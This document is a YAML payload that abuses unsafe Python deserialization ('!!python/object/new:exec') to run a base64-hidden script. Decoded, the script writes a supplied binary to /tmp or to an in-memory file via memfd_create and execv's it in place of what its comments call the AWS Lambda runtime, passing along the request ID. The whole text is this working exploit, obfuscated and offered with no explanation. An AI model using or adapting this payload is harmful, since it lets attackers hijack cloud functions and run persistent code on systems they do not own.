!!python/object/new:exec  [ "payload_b64 = b'aW1wb3J0IG9zCmltcG9ydCBjdHlwZXMgCmltcG9ydCBpbnNwZWN0CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKCk1FTUZEX0NSRUFURV9TWVNDQUxMID0gMzE5CgojIERlY29kZSBuZXcgcnVudGltZQpuZXdfcnVudGltZSA9IGI2NGRlY29kZShleHRlcm5hbF9kYXRhX2I2NCkgICMgZXh0ZXJuYWxfZGF0YV9iNjQgaXMgZGVmaW5lZCBpbiB0aGUgeWFtbCBmaWxlCgojIFdyaXRlIHRoZSBuZXcgcnVudGltZSBpbnRvIGEgZmlsZSAKaWYgb3MuYWNjZXNzKCIvdG1wIiwgb3MuV19PSyk6CiAgICBuZXdfcnVudGltZV9wYXRoID0gIi90bXAvbmV3X3J1bnRpbWUiCiAgICB3aXRoIG9wZW4obmV3X3J1bnRpbWVfcGF0aCwgIndiIikgYXMgZjoKICAgICAgICBmLndyaXRlKG5ld19ydW50aW1lKQogICAgb3MuY2htb2QobmV3X3J1bnRpbWVfcGF0aCwgMG83NzcpCmVsc2U6CiAgICAjIEluIGNhc2UgL3RtcCBpcyByZWFkLW9ubHksIGNyZWF0ZSB0aGUgbmV3IHJ1bnRpbWUgZmlsZSBpbiBtZW1vcnkgCiAgICBtZW1mZCA9IGN0eXBlcy5DRExMKCIiKS5zeXNjYWxsKE1FTUZEX0NSRUFURV9TWVNDQUxMLCAibmV3X3J1bnRpbWUiLCAwKQogICAgb3Mud3JpdGUobWVtZmQsIG5ld19ydW50aW1lKQogICAgbmV3X3J1bnRpbWVfcGF0aCA9ICIvcHJvYy9zZWxmL2ZkLyIgKyBzdHIobWVtZmQpCgojIEdldCB0aGUgaW52b2tlIGlkIGZyb20gdGhlIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQgdmFyaWFibGUgaW4gYm9vdHN0cmFwLnB5Cmludm9rZV9pZCA9IHN0cihpbnNwZWN0LnN0YWNrKClbLTJdWzBdLmZfZ2xvYmFsc1siX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCJdKQoKIyBFeGVjIHRoZSBuZXcgcnVudGltZQphcmdzID0gW25ld19ydW50aW1lX3BhdGgsIGludm9rZV9pZF0Kb3MuZXhlY3YobmV3X3J1bnRpbWVfcGF0aCwgYXJncykKCgoKCg=='; external_data_b64 = b'';     from base64 import b64decode; payload = b64decode(payload_b64).decode('utf8');     exec(payload)" ]